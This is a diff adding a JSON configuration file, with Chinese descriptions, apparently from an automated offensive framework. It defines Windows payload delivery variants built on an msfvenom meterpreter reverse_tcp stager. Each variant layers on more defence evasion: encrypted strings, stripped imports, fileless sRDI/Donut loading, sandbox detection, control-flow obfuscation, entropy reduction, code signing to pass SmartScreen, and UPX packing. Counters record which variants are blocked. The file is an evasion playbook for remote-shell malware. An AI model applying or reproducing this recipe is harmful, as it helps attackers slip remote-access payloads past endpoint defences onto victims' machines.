@@ -1,0 +1,149 @@
+{
+  "id": "w005",
+  "name": "Windows 上线载荷投递（免杀栈逐层累加）",
+  "family": "payload/windows",
+  "match": {
+    "os": "windows",
+    "arch": "x64"
+  },
+  "variants": [
+    {
+      "vid": "v1",
+      "desc": "原始 stager，直接落盘执行（对照组，应被拦）",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe -o a.exe",
+      "sig": ["meterpreter", "msfvenom-stub", "reverse_tcp"],
+      "stack": [],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v2",
+      "desc": "字符串加密 + 导入表擦除（去掉最廉价的静态特征）",
+      "command": "自定义 loader：AES 常量 + 只留 LoadLibrary/GetProcAddress，其余 PEB 遍历解析",
+      "sig": [],
+      "stack": ["obf.string-enc", "obf.import-strip"],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v3",
+      "desc": "v2 + sRDI 反射加载，磁盘零落地",
+      "command": "Donut 打包为 position-independent shellcode → 自写 loader 内存加载",
+      "sig": [],
+      "stack": ["obf.string-enc", "obf.import-strip", "fileless.srdi"],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v4",
+      "desc": "v3 + 抗沙盒三件套（睡眠加速 / 资源规格 / 机器名黑名单）",
+      "command": "运行前 sleep 90s 并核对实际耗时；CPU<2 核或内存<2G 直接退出；HAL9KA/CUCKOO 主机名退出",
+      "sig": [],
+      "stack": [
+        "obf.string-enc",
+        "obf.import-strip",
+        "fileless.srdi",
+        "sb.sleep-skip",
+        "sb.resource-check",
+        "sb.domain-check"
+      ],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v5",
+      "desc": "v4 + 反编译对抗（控制流平坦化 + 跳转花指令 + 垃圾指令段）",
+      "command": "OLLVM -fla -sub 编译核心逻辑；入口插 E9 花指令；未引用段填不可达指令",
+      "sig": [],
+      "stack": [
+        "obf.string-enc",
+        "obf.import-strip",
+        "fileless.srdi",
+        "sb.sleep-skip",
+        "sb.resource-check",
+        "sb.domain-check",
+        "obf.control-flow",
+        "junk.jmp",
+        "junk.dead-code"
+      ],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v6",
+      "desc": "v5 + 降熵（段填充 + 延迟解密 + 段权限细化），压掉高熵特征",
+      "command": "载荷分片存放，运行到对应阶段才解密；RW→RX 两步改权限；零填充把整体熵压到 6.3",
+      "sig": [],
+      "stack": [
+        "obf.string-enc",
+        "obf.import-strip",
+        "fileless.srdi",
+        "sb.sleep-skip",
+        "sb.resource-check",
+        "sb.domain-check",
+        "obf.control-flow",
+        "junk.jmp",
+        "junk.dead-code",
+        "ent.pad",
+        "ent.delay-decrypt",
+        "pack.section-perm"
+      ],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v7",
+      "desc": "v6 + 有效代码签名 + 时间戳（过 SmartScreen / 驱动加载的最强单层）",
+      "command": "signtool sign /fd sha256 /tr http://timestamp.digicert.com /td sha256 /f cert.pfx",
+      "sig": [],
+      "stack": [
+        "obf.string-enc",
+        "obf.import-strip",
+        "fileless.srdi",
+        "sb.sleep-skip",
+        "sb.resource-check",
+        "sb.domain-check",
+        "obf.control-flow",
+        "junk.jmp",
+        "junk.dead-code",
+        "ent.pad",
+        "ent.delay-decrypt",
+        "pack.section-perm",
+        "sign.valid-cert",
+        "sign.timestamp"
+      ],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v8",
+      "desc": "低成本路线：UPX + 降熵（易被加壳检测命中，用于对照成本与效果的取舍）",
+      "command": "upx -9 --ultra-brute a.exe；再用零填充把熵拉回 6.5 以下",
+      "sig": ["UPX0", "UPX1", "upx-stub"],
+      "stack": ["obf.string-enc", "pack.upx", "ent.pad"],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    }
+  ],
+  "evasion": {},
+  "attempts": [],
+  "derived": [],
+  "created_at": "2026-11-15T00:00:00Z",
+  "updated_at": "2026-11-15T00:00:00Z"
+}
